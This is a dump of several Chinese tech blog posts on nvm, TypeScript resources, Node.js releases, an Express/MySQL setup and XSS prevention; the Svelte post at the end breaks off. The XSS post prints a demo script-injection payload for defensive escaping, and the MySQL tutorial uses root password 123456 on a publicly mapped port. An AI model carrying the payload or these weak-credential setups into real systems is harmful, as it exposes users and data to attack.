nvm 切換正在使用的 Node.js 版本，可用 use 指令 1 nvm use v16.18.0 如果切換的目標版本還沒安裝，nvm 會提醒你要安裝：\n1 2 $ nvm use v14.18.0 node v14.18.0 (64-bit) is not installed. 透過 nvm 安裝 Node.js 時，nvm 會將不同的 Node.js 版本儲存在 ~/.nvm/versions/node/vX.X.X，然後再修改 $PATH，將指定版本的 Node.js 路徑加入：\n1 2 3 4 5 6 7 8 9 10 $ nvm current v10.16.3 $ echo $PATH /home/titan/.nvm/versions/node/v10.16.3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $ use v12.13.1 $ nvm current v12.13.1 $ echo $PATH /home/titan/.nvm/versions/node/v12.13.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 在 nvm 的各個 Node.js 版本安裝的全域套件都會在各自版本的目錄內安裝，所以在切換至新安裝的 Node.js 版本後需要重新安裝，也因為如此，不同版本間的套件就不會有衝突問題。\ncurrent：查看目前使用的版本 Usage： 1 nvm current 如果忘記自己切換到哪個版本，可以用 current 指令 1 2 $ nvm current v16.18.0 run：直接執行 Node.js (NVM 1.1.9版已拔除) 如果要直接執行 Node.js，可以使用下面指令 1 2 3 4 5 $ nvm run node Running node v16.18.0 (npm v8.19.2) Welcome to Node.js v16.18.0. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; exec：指定要執行的 Node.js 版本 (NVM 1.1.9版已拔除) 1 2 3 4 5 $ nvm exec 12.8.1 node Running node v12.8.1 (npm v6.10.2) Welcome to Node.js v12.8.1. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; which：察看 Node.js 的安裝路徑 (NVM 1.1.9版已拔除) 執行下面指令可以查看特定版本的 Node.js 的安裝路徑 1 2 $ nvm which 12.8.1 /home/titan/.nvm/versions/node/v12.8.1/bin/node alias：查看別名、設定別名 Usage： 1 2 3 4 5 6 7 8 9 10 11 12 $ nvm alias default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) 如下圖有些版本的文字是紅色或是顯示 N/A，就代表該版本未在電腦安裝 預設 alias 可以取代版本號 node：安裝最新版的 Node.js iojs：安裝最新版的 io.js stable：此 alias 已棄用，僅適用於 v0.12 以及更舊版，目前改為 node alias unstable：此 alias 為 v0.11，最後一個 “unstable” (不穩定) Node release，在 v1.0 之後的版本都是穩定版 (in SemVer, versions communicate breakage, not stability) 可在下面這些指令使用以上預設別名：\nnvm install nvm use nvm run nvm exec nvm which … 等 設定別名 1 2 $ nvm alias v16-test v16.18.0 v16-test -\u0026gt; v16.18.0 接著用 nvm alias 指令就會看到剛剛新增的別名所對應的 Node.js 版本 1 2 3 4 5 6 7 8 9 10 11 12 13 $ nvm alias v16-test -\u0026gt; v10.15.3 default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) 常見錯誤原因 報錯 exit status 1(或 exit status 5) 問題 出現 exit status 1 存取被拒 或 exit status 5 存取被拒，需要用管理員身分打開 cmd 命令列工具，再執行 nvm use \u0026lt;version\u0026gt; 即可。\n報錯 exit status 145 問題 這個問題可以在 github nvm-windows 下找到答案，nvm 安裝的時候有兩個安裝目錄，一個是 nvm 安裝目錄，一個是 nodejs 安裝目錄，這兩個安裝目錄名不能出現空格或中文，但是 nodejs 默認安裝目錄是 C:\\Program Files\\nodejs，這個目錄中間有空格，需要我們自定義一個安裝目錄，即可解決這個問題。\nBONUS：永遠以系統管理者身份執行 每次都要使用「以系統管理者身份執行」來開啟終端機是真的滿麻煩的，所以你其實可以針對應用程式永遠「以系統管理者身份執行」，首先點你要永遠執行的程式右鍵選內容\n點選下方進階\n將「以系統管理員身份執行」打勾\n搞定，之後使用捷徑打開 cmd 時，皆為「以系統管理員身份執行」\n總結 nvm 指令整理\n指令 功能 nvm versionnvm v 查看 nvm 版本 nvm install \u0026lt;version\u0026gt; 安裝指定 \u0026lt;version\u0026gt; 版本的 Node.js(建議安裝 LTS 版本) nvm lsnvm ls installed 查看目前已安裝的 Node.js 版本 nvm ls available 查看目前可安裝的 Node.js 版本 nvm use \u0026lt;version\u0026gt; 切換指定 \u0026lt;version\u0026gt; 版本的 Node.js nvm current 查看當前使用的 Node.js 版本 ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457342886_5035af0537_o.png","permalink":"https://wayneblog.ga/2022-10-27/nodejs-nvm/","title":"nvm - Nodejs 版本隨你切換"},{"content":" 參考網站\nTypeScript 是微軟開發的一個開源的編程語言，通過在 JavaScript 的基礎上添加靜態類型定義構建而成。TypeScript 通過 TypeScript 編譯器或 Babel 轉譯爲 JavaScript 代碼，可運行在任何瀏覽器和操作系統。下面來分享 10 個值得學習的 TypeScript 寶庫！\nTypeScript 官方文檔 TypeScript 官方文檔，提供了中文版本。\nGithub：https://github.com/microsoft/TypeScript\n學習 TypeScript 點我前往\n可能是中國最好的 TypeScript 入門到進階系統教程。\nGithub：https://github.com/mqyqingfeng/learn-typescript\nTypeScript 使用指南手冊 點我前往\nTypeScript 使用手冊（中文版）翻譯。\nGithub：https://github.com/zhongsp/TypeScript\n深入理解 TypeScript 點我前往\nTypeScript Deep Dive 中文版。\nGithub：https://github.com/jkchao/typescript-book-chinese\nTypeScript 入門教程 點我前往\n從 JavaScript 程序員的角度總結思考，循序漸進地理解 TypeScript。\nGithub：https://github.com/xcatliu/typescript-tutorial\nTypeScript 類型挑戰 點我前往\n高質量的類型可以提高項目的可維護性並避免一些潛在的漏洞。本項目意在於讓你更好地瞭解 TS 的類型系統，編寫你自己的類型工具，或者只是單純的享受挑戰的樂趣！\nGithub：https://github.com/type-challenges/type-challenges\nDefinitelyTyped DefinitelyTyped 包含大量的高質量的 TypeScript 類型定義。通過使用 DefinitelyTyped 及其包含的聲明文件，我們可以使用大多數流行的 JavaScript 庫，就像它們是 TypeScript 庫一樣，將通過編譯器進行類型驗證。\nGithub：https://github.com/DefinitelyTyped/DefinitelyTyped\nreact-redux-typescript-guide 點我前往\n本指南記錄了有關在 React（及其生態系統）中以函數式風格使用 TypeScript 的模式和祕訣。它將使代碼類型安全，同時專注於從實現中推斷類型，從長遠來看更容易編寫和維護正確的類型。\nGithub：https://github.com/piotrwitek/react-redux-typescript-guide\nReact+TypeScript 備忘錄 點我前往\n專注於幫助 React 開發人員在 React 應用中使用 TypeScript。\nGithub：https://github.com/typescript-cheatsheets/react\nclean-code-typescript 點我前往\n將 Clean Code 的概念適用到 TypeScript，引導讀者使用 TypeScript 編寫易讀、可擴展的應用。\nGithub：https://github.com/labs42io/clean-code-typescript\n谷歌 TypeScript 風格指南 點我前往\nGoogle TypeScript 風格指南。\nGithub：https://google.github.io/styleguide/tsguide.html\nAwesome TypeScript 點我前往\n很棒的 TypeScript 資源。\nGithub：https://github.com/semlinker/awesome-typescript\n","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52458187213_d3e26e7c48_o.png","permalink":"https://wayneblog.ga/2022-10-27/ts-learning-12-website/","title":"推薦 12 個值得學習的 TypeScript 寶庫！"},{"content":" 參考網站\n參考網站\nNode.js 19 在 2022-10-18 正式發布了，此次更新包括將 V8 JavaScript 引擎更新到 10.7，以及默認啟用 HTTP (s)/1.1 KeepAlive。\nNode.js 18 在本月晚些時候將進入長期支持（LTS），Node.js 19 將取代 Node.js 18 成為 \u0026ldquo;Current\u0026rdquo; 版本。\n官方文檔 node \u0026ndash;watch (實驗性) 運行時，增加了一個令人興奮的功能，支持使用 node --watch，選項在 \u0026ldquo;watch\u0026rdquo; 模式下運行。在 \u0026ldquo;watch\u0026rdquo; 模式下運行，當導入的文件被改變時，會重新啟動進程。\n1 node --watch index.js 此功能在 v19.0.0 和 v18.11.0+ 中可用。\n默認啟用 HTTP(S)/1.1 KeepAlive 從這個版本開始，Node.js 默認將 keepAlive 設置為 true，這意味著任何出站的 HTTP (s) 連線將自動使用 HTTP 1.1 Keep-Alive。默認的 keep-alive 時間是 5 秒。\n啟用 keep-alive 將提供更好的吞吐量，因為連接在默認情況下被重複使用。\n穩定的 WebCrypto WebCrypto API 現在已經穩定（以下算法除外：Ed25519、Ed448、X25519 和X448)\n使用 globalThis.crypto 或 require('node:crypto').webcrypto 來訪問這個模塊。\n自定義 ESM Resolution 調整 Node.js 已經刪除了 --experimental-specifier-resolution 標誌，其功能現在可以通過自定義加載器實現。\n移除 DTrace/SystemTap/ETW 支持 對 DTrace/SystemTap/ETW 的支持在 v19.0.0 中被移除，主要原因是資源的優先級問題。\n如果你有興趣幫助恢復 DTrace，可以查看該 issue：https://github.com/nodejs/node/issues/44550。\n依賴 V8 10.7 V8 引擎已經更新到 10.7 版本，這是 Chromium 107 的一部分。這個版本包括了 JavaScript API 的一個新特性：Intl.NumberFormat。\nIntl.NumberFormatv3 API 是一個新的 TC39 ECMA402 第三階段提案，擴展了先前存在的 Intl.NumberFormat。\nllhttp Node.js 19 搭載了 llhttp@8.1.0\nnpm Node.js 19 搭載了 npm@8.19.2\nNode.js 18 將進入 LTS Node.js 18 系列將在下週過渡到長期支持版本。\n生命週期 Node.js 14 將在 2023 年 4 月達到生命週期結束，因此建議用戶開始計劃升級到 Node.js 16（LTS）或 Node.js 18（LTS）。\nNode.js 16 (LTS) 將在 2023 年 9 月達到生命週期結束，比原計劃 2024 年 4 月提前了。\n更多詳情可查看：https://nodejs.org/en/blog/announcements/v19-release-announce/\n補充： Nodejs 16 的新特性 原文網址：https://weekly.shanyue.tech/release/node-16/\nNode 16 於四月二十日發布，山月在第一時間下載了Node16 體驗了以下新特性。偶數號的版本為LTS 版本，這將是既Node14 之後的下一個長期支持版本，Node14 在2020-10-27 已進入 Active LTS 階段，還沒有升級的同學要盡量更新呀。\n從 Node 16 Release 官方文檔 列出了此次它所有的新特性以及非常詳細的提交記錄。那它到底更新了哪些新特性，先讓我們一睹為快吧！\nTimers Promise API Timers Promise API 其實在 Node 15 就已存在，那時候是一個實驗特性，目前已進入了穩定階段，是一項令人興奮的特性。那它到底是幹什麼用的呢？\n先別急，在此之前，先看一個問題：如何實現一個sleep/delay 函數？\n答案也很簡單，使用 Promise 封裝一個 setTimeout 即可\n1 const sleep = (t = 0) =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, t)); 那有了 Timers Promise 之後呢，使用 setTimeout 直接可替代 sleep 功能，驚不驚喜。\n1 2 3 import { setTimeout } from \u0026#39;timers/promises\u0026#39;; await setTimeout(100); setTimeout 的第二個參數接收一個值，作為 Promise 成功後的返回值\n1 2 3 4 const r = await setTimeout(100, \u0026#39;hello, world\u0026#39;); //=\u0026gt; hello, world console.log(r); 而當 setInterval 也變為 Promise 形式後，對於每間隔一分鐘便執行操作的定時任務而言，具有更大的可讀性\n1 2 3 4 5 6 7 import { setInterval } from \u0026#39;timers/promises\u0026#39;; for await (const startTime of setInterval(100, Date.now())) { const now = Date.now(); if ((now - startTime) \u0026gt; 1000) break; }; 底層依賴升級 我們知道，Node 基於 v8、libuv、llhttp 等諸多依賴，這次它對諸多依賴進行了升級。如同我們的業務項目依賴於諸多軟件包，每一次依賴的升級也會對性能造成不少提升\nv8 升級到 9.0，主要是 ECMAScript RegExp Match Indices llhttp 升級到 6.0.0，用以解析 HTTP 報文 icu 升級到 69.1 npm 升級到 7.10.0 使用 process.versions 可看到相關依賴的版本號\n1 \u0026gt; process.versions export 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \u0026#34;node\u0026#34;: \u0026#34;16.0.0\u0026#34;, \u0026#34;v8\u0026#34;: \u0026#34;9.0.257.17-node.10\u0026#34;, \u0026#34;uv\u0026#34;: \u0026#34;1.41.0\u0026#34;, \u0026#34;zlib\u0026#34;: \u0026#34;1.2.11\u0026#34;, \u0026#34;brotli\u0026#34;: \u0026#34;1.0.9\u0026#34;, \u0026#34;ares\u0026#34;: \u0026#34;1.17.1\u0026#34;, \u0026#34;modules\u0026#34;: \u0026#34;93\u0026#34;, \u0026#34;nghttp2\u0026#34;: \u0026#34;1.42.0\u0026#34;, \u0026#34;napi\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;llhttp\u0026#34;: \u0026#34;6.0.0\u0026#34;, \u0026#34;openssl\u0026#34;: \u0026#34;1.1.1k+quic\u0026#34;, \u0026#34;cldr\u0026#34;: \u0026#34;39.0\u0026#34;, \u0026#34;icu\u0026#34;: \u0026#34;69.1\u0026#34;, \u0026#34;tz\u0026#34;: \u0026#34;2021a\u0026#34;, \u0026#34;unicode\u0026#34;: \u0026#34;13.0\u0026#34;, \u0026#34;ngtcp2\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34;, \u0026#34;nghttp3\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34; } btoa 與 atob 關於 Base64 的轉化，Node 在以前使用了 Buffer.from，而現在支持 btoa/atob 與瀏覽器環境保持了一致。\n而對於一個 SSR 項目而言，執行環境的區分將無關緊要，統一使用 btoa/atob 就好了\n1 2 3 4 5 6 7 8 const base64 = { encode (v: string) { return isBrowser ? btoa(v) : Buffer.from(v).toString(\u0026#39;base64\u0026#39;); }, decode (v: string) { return isBrowser ? atob(v) : Buffer.from(v, \u0026#39;base64\u0026#39;).toString(); } } 更多 關於 Node16 升級的諸多小細節，可參閱版本發布獲取更多信息，可持續 Wayne\u0026rsquo;s Blog 對各軟件每一次重大版本升級的說明講解。\n","date":"2022-10-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52449163172_6f0c5b3278_o.jpg","permalink":"https://wayneblog.ga/2022-10-24/nodejs-v19-release/","title":"Node v19 正式發布"},{"content":" 參考網站\n參考網站\n本文主要是展示使用 Express 和 MySQL 來搭建項目框架的步驟，展示瞭如何搭建項目並進行基本操作。\n創建項目 Express 是基於 Node.js 平台，快速、開放、極簡的 Web 開發框架。\n全局安裝 express-generator express-generator 是 Express 應用程序生成器工具，我們可以使用它來快速創建應用程序框架。\n1 2 3 4 npm install -g express-generator # (expressFrame 是項目名) express expressFrame 項目的目錄結構\nbin/www 是啟動入口文件，在裡面可以設置端口號等 下載依賴 創建好項目之後，裡面有包含基本的項目文件，也有相關依賴\n1 npm install 啟動項目 1 2 3 4 npm start # 啟動命令還可以是： # node ./bin/www 安裝 nodemon 可以安裝 nodemon 來監控 node.js 源代碼的任何變化和自動重啟你的服務器\n全局安裝 nodemon：\n1 npm install -g nodemon 啟動項目\n1 nodemon bin/www 這就啟動成功啦\n瀏覽器打開http://localhost:3000就能看到頁面啦\n安裝 winston 添加打印日誌文件 這裡採用的是 winston 日誌\n具體用法可看文檔：https://www.npmjs.com/package/winston\n1 npm i winston 配置打印日誌格式 在項目的根目錄添加一個配置打印日誌格式的文件 logger.js （此文件在 github 上）\n修改 app.js 的配置 修改項目默認的變量名：\n將 const logger = require('morgan'); 改成：const morgan = require('morgan') 相應的也要把 app.use(logger('dev')); 改成：app.use(morgan('dev')); 1 2 3 4 5 6 7 // ... - const logger = require(\u0026#39;morgan\u0026#39;); + const morgan = require(\u0026#39;morgan\u0026#39;); - app.use(logger(\u0026#39;dev\u0026#39;)); + app.use(morgan(\u0026#39;dev\u0026#39;)); // ... 引入 logger.js 文件 1 const logger = require(\u0026#39;./logger\u0026#39;) 修改錯誤處理 將錯誤打印到日誌上\n測試日誌是否打印成功 請求一個不存在的路由，如：http://localhost:3000/hello\n打開日誌文件，看到這條錯誤被打印出來就成功啦\nMySQL 啟動數據庫 這裡使用的方法是用 Docker 安裝 MySQL\n這裡是安裝的教程：https://www.runoob.com/docker/docker-install-mysql.html\ndocker 拉取 MySQL 鏡像 1 docker pull mysql:latest 查看本地鏡像 1 docker images 運行容器 1 2 # docker run -itd --name {容器名} -p 3306:3306 -e MYSQL_ROOT_PASSWORD={MySQL root 密碼} mysql docker run -itd --name mysql-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql 參數說明：\n-p 3306:3306：映射容器服務的3306端口到宿主機的3306端口，外部主機可以直接透過 宿主機ip:3306 訪問到 MySQL 的服務。 MYSQL_ROOT_PASSWORD=123456：設置 MySQL 服務 root 用戶的密碼。 安裝成功 透過 docker ps 命令查看是否安裝成功\n本機可以通過 root / 123456 訪問 MySQL 服務。\n安裝數據庫管理工具 Sequel Pro macOS 用戶安裝 navicat windows 用戶安裝 這裡選擇用 Sequel Pro 啟動好數據之後，就在 Sequel Pro 連接數據庫，密碼是啟動數據庫時自己設置的密碼\n使用 Navicat 數據庫管理工具連線時，出現錯誤 若出現 1251 - Client does not support authentication protocol requested by server; consider upgrading MySQL client 錯誤，原因為：\nmysql8 之前的版本，加密規則是 mysql_native_password，而 mysql8 之後的版本，加密規則是 caching_sha2_password\n解決方法： 升級 navicat 驅動。 進到容器內，把 mysql 用戶登入密碼加密規則還原成 mysql_native_password 以下採用方法2解決，操作如下：\n1. 打開 cmd，輸入以下指令以 bash 進入容器： 1 2 # docker exec -it {容器名} bash docker exec -it mysql-test bash 2. 使用 mysql 指令連線資料庫： 1 mysql -u root -p 3. 使用 mysql 指令查詢用戶訊息： 1 select host, user, plugin, authentication_string from mysql.user; host 為 % 表示不限制 ip、localhost 表示本機使用\nplugin 非 mysql_native_password 則需要修改密碼\n4. 使用 mysql 指令修改密碼： 更新 user 為 root， host 為 % 的密碼為 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; 更新 user 為 root， host 為 localhost 的密碼為 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; 5. 再次在 Navicat 中連接 mysql，連接成功 創建數據庫 使用數據庫管理工具新建數據庫 database 名稱為：expressFrame\n進入 expressFrame 庫，新建用戶信息表為 user ，默認有 id 字段，需要再添加以下必要字段：\n字段：id\n1 2 Field:name Type:VARCHAR LENGTH:255 Comment:姓名 Field:phone Type:VARCHAR LENGTH:255 Comment:手機號 使用 Knex.js 增刪改查數據庫 Knex.js 是為 Postgres、MSSQL、MySQL、MariaDB、SQLite3、Oracle 和 Amazon Redshift 設計的 SQL 查詢構建器，其設計靈活，便於攜帶並且使用起來非常有趣。Knex 的主要目標環境是 Node.js，您需要安裝該 knex 庫，然後安裝適當的數據庫庫：pg 適用於 PostgreSQL、CockroachDB 和 Amazon Redshift，pg-native 對於具有本機 C++ libpq 綁定的 PostgreSQL（需要安裝 PostgresSQL 才能鏈接），mysql 適用於 MySQL 或 MariaDB，sqlite3 適用於 SQLite3，tedious 適用於 MSSQL。\nFlag Library pg PostgreSQL、CockroachDB、Amazon Redshift pg-native 本機 C++ libpq 綁定的 PostgreSQL（需要安裝 PostgresSQL 才能鏈接） mysql MySQL、MariaDB sqlite3 SQLite3 tedious MSSQL 下載相關依賴 1 npm install -save knex mysql 添加配置信息 在項目根目錄下，新建配置信息 config.js，之後的配置信息涉及到數據庫和密碼，不上傳到 Github 等託管平台，所以需要單獨設置，使用 .gitignore 避免上傳。之後敏感的配置信息，都將在此配置。host 地址為數據庫的服務地址，本地為 127.0.0.1\nconfig.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const configs = { mysql: { host: \u0026#39;127.0.0.1\u0026#39;, port: \u0026#39;3306\u0026#39;, user: \u0026#39;root\u0026#39;, password: \u0026#39;123456\u0026#39;, // 自己設置的密碼 database: \u0026#39;expressFrame\u0026#39; // 數據庫的名字 }, // 打印错误 log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } } module.exports = configs 新建 .gitignore 在項目根目錄下，新建 .gitignore 避免上傳 config.js 、log、 node_modules 等不需要被上傳到 Github 的文件。\n.gitignore 1 2 3 4 5 6 7 .DS_Store .idea npm-debug.log yarn-error.log node_modules log config.js 數據庫配置 新建 models/knex.js，初始化配置 knex\nmodels/knex.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 引用配置文件 const configs = require(\u0026#39;../config\u0026#39;); // 把配置文件中的信息，設置在初始化配置中 module.exports = require(\u0026#39;knex\u0026#39;)({ client: \u0026#39;mysql\u0026#39;, connection: { host: configs.mysql.host, port: configs.mysql.port, user: configs.mysql.user, password: configs.mysql.password, database: configs.mysql.database }, // 打印錯誤 log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } }) knex 增刪改查 在 models 下新建文件 base.js\nmodels/base.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 const knex = require(\u0026#39;../models/knex\u0026#39;); class Base{ constructor(props){ this.table = props; } // 查找 all (){ return knex(this.table).select(); } // 新增 insert (params){ return knex(this.table).insert(params); } // 更改 update (id, params){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).update(params); } // 删除 delete (id){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).del(); } } module.exports = Base; 新建用戶模型 在 models 下新建文件 user.js\nmodels/user.js 1 2 3 4 5 6 7 8 9 10 const Base = require(\u0026#39;./base\u0026#39;); class User extends Base { // 定義參數默認值為 user 表 constructor(props = \u0026#39;user\u0026#39;){ super(props); } } module.exports = new User(); 新建用戶控制器 在根目錄新建控制器文件夾 controllers，在 controllers 新建 user.js，並設置 showUser 方法\ncontrollers/user.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 引用用户模版数据 const User = require(\u0026#39;../models/user.js\u0026#39;); const userController = { // showUser 獲取用戶數據並返回到頁面 showUser: async function(req,res,next){ try{ let userData = await User.all() res.json({ code: 200, message: \u0026#34;操作成功\u0026#34;, data: userData }) }catch(e){ res.json({ code: 0, message: \u0026#34;操作失敗\u0026#34;, data: e }) } }, } module.exports = userController; 添加獲取用戶接口 修改路由 routes/index.js，添加獲取用戶信息的接口\nroutes/index.js 1 2 3 4 const userController = require(\u0026#39;../controllers/user\u0026#39;); // 獲取用戶信息 router.get(\u0026#39;/get_user\u0026#39;, userController.showUser); 測試接口 訪問一下 http://localhost:3000/get_user\n查看接口返回的數據\n這就大功告成啦～\ngithub地址：https://github.com/wjdesign/nodejsExpressMysqlDemo\n走過路過點個贊唄～\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52443177409_7e96fe402c_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-express-mysql/","title":"Node.js + Express + MySQL 搭建項目框架"},{"content":" 參考網站\n簡介 xss 是常見的攻擊方式之一，不管是前端還是後端都要對此有所防範才行。\n本文主要講解使用 NodeJS 開發的後端程序應該如何防範 xss 攻擊。\nxss演示 xss 攻擊方式主要是在在頁面展示內容中摻雜 js代碼，以獲取網頁信息。\n常見的攻擊地方有：\n電商產品評價區：某用戶提交的評價帶有可執行的js代碼，其他用戶查看該評論時就會執行那段js代碼。 博客網站：某用戶在博客的標題或者內容中帶有可執行的js代碼，其他用戶查看該博客時那段 js代碼 就會被執行。 比如在輸入框輸入\n1 \u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt; 別的用戶在自己頁面要展示上面這段內容個，頁面有可能會彈出一個彈窗。\n這個例子只是彈出一個對話框，如果人家有惡意，獲取cookie 等信息，然後傳給自己的服務器，那後果真的很嚴重。\nxss防禦 預防措施：轉義特殊字符\n特殊符號轉換\n1 2 3 4 5 6 \u0026amp; -\u0026gt; \u0026amp;amp; \u0026lt; -\u0026gt; \u0026amp;lt; \u0026gt; -\u0026gt; \u0026amp;gt; \u0026#34; -\u0026gt; \u0026amp;quot; \u0026#39; -\u0026gt; \u0026amp;#x27; / -\u0026gt; \u0026amp;#x2F; 上面我羅列了幾個常見的特殊字符。從上面的例子可以看出，輸入了 \u0026lt;script\u0026gt; 標籤後，裡面的內容有可能會被執行。\n如果我們把 \u0026lt;script\u0026gt; 改成 \u0026amp;lt;script\u0026amp;gt; 那麼瀏覽器就不把這段內容看成是可執行代碼。\n在日常開發中，我們不需要自己編寫轉義功能的代碼，只需要下載 xss 的依賴包就行。\n安裝 xss 依賴包\n1 npm install xss --save 使用 xss。 xss 其實是一個方法，只需要把要轉義的內容傳入 xss 方法即可。\n1 2 3 4 const xss = require(\u0026#39;xss\u0026#39;) const content = xss(\u0026#39;\u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt;\u0026#39;) console.log(content) 最後輸出\n1 \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt; 以上就是 xss攻擊 在後端的防禦方法。\n如果嚴謹一點的話，在前端也可以把文本域的內容裡的特殊字符轉義一遍再傳給後端。\n後端傳給前端的內容有可能會在頁面展示成 \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt;，這部分需要前端自己去處理。\n插則花邊新聞\n之前看到有則新聞說 Vue 不安全，某些ZF項目中使用 Vue 受到了 xss 攻擊。後端甩鍋給前端，前端甩鍋給了 Vue。\n後來聽說是前端胡亂使用 v-html 渲染內容導致的，而 v-html 這東西官方文檔也提示了有可能受到 xss 攻擊。\n尤雨溪：很多人就是不看文檔\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52442821071_35fc2e7087_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-prevent-xss/","title":"NodeJS 防止 xss 攻擊"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n其實在很久之前我就注意到 Svelte，但一直沒把這個框架放在心上。\n因為我之前的工作主要使用 Vue，但完全沒遇到過使用 Svelte 的項。\n直到 Vite 的出現，我才開始開始重視 Svelte。\n從 Vite 文檔 裡可以看到它支持這些模板：\nJavaScript TypeScript vanilla vanilla vue vue react react preact preact lit lit svelte svelte 能讓祖師爺也重視的框架，不簡單不簡單~\n我喜歡用 Demo 的方式學習新技術，Svelte 官方入門教程 就提供了這種方式。\n這是我覺得入門比較舒服且方便日後搜索的學習方式。\n雖然 Svelte 官方入門教程 已經給出很多例子，而且 Svelte中文網 也有對應的翻譯，但有些翻譯看上去是機譯，而且部分案例可能不太適合新手學習~\n本文的目的是把 Svelte 的學習流程梳理出來，讓第一次接觸 Svelte 的工友能順利上手。\n本文適合人群：有HTML、CSS、JS基礎，知道並已經安裝了Node。\n如果你是打算從0開始學習前端，那本文暫時還不適合你閱讀。\nSvelte 簡介 Svelte 是一個構建web 應用程序的工具。\n傳統框架如React 和Vue 在瀏覽器中需要做大量的工作，而Svelte 將這些工作放到構建應用程序的編譯階段來處理。\n需要注意，Svelte 是一款編譯器。它可以將按照規定語法編寫的代碼打包成瀏覽器能運行的項目。\n和其他前端框架一樣，同樣也是使用HTML、CSS 和 JavaScript 進行開發。\n作者 在學習 Svelte 之前先了解一下它的父親（作者）。\nSvelte 的作者叫 Rich Harris\n可能國內大多數工友對他不是很熟悉（我也完全不熟），但應該聽過 Rollup。\n沒錯，他也是 Rollup 的爸爸。\n他在開發 Svelte 之前還開發過 Ractive.js，聽說 Vue 的部分實現也是受到了 Ractive 的啟發。\n關於 Rich Harris 的介紹還有很多，我搜到的資料上這樣介紹到：\n大學專業是學哲學的 在紐約時報調查組工作的圖形編輯，身兼記者和開發者職位 還有更多關於他和 Svelte 的介紹，可以看看《Svelte - The magical disappearing UI framework - Interview with Rich Harris》\nSvelte 的優勢 Svelte 翻譯成中文就是 苗條 的意思，側面表明它打包出來的包非常小。\nSvelte 主要優勢有以下幾點。\n編譯器 在打開 Svelte官網 時就能看到這樣的介紹。\nSvelte 是一種全新的構建用戶界面的方法。傳統框架如 React 和 Vue 在瀏覽器中需要做大量的工作，而 Svelte 將這些工作放到構建應用程序的編譯階段來處理。\nSvelte 組件需要在 .svelte 後綴的文件中編寫，Svelte 會將編寫好的代碼翻編譯 JS 和 CSS 代碼。\n打包體積更小 Svelte 在打包會將引用到的代碼打包起來，而沒引用過的代碼將會被過濾掉，打包時不會加入進來。\n在 《A RealWorld Comparison of Front-End Frameworks with Benchmarks (2019 update)》 報告中，對主流框架進行了對比。\n在經過 gzip 壓縮後生成的包大小，從報告中可以看出，Svelte 打包出來的體積甩開 Vue、React 和 Angular 幾條街。\n這是因為經過 Svelte 編譯的代碼，僅保留引用到的部分。\n不使用 Virtual DOM Virtual DOM 就是 虛擬DOM，是用 JS 對象描述 DOM 節點的數據，由 React 團隊推廣出來的。\n虛擬DOM 是前端的網紅，因此也有很多開發者開始研究和搞辯論賽。\n網上有一張圖對比了 Svelte 和 React 在數據驅動視圖的流程\n其實主要對比了使用虛擬DOM和直接操作真實DOM的區別。 在 React 中實現數據驅動視圖大概流程是這樣的：\n1 數據發生變化 -\u0026gt; 通過diff算法判斷要更新哪些節點 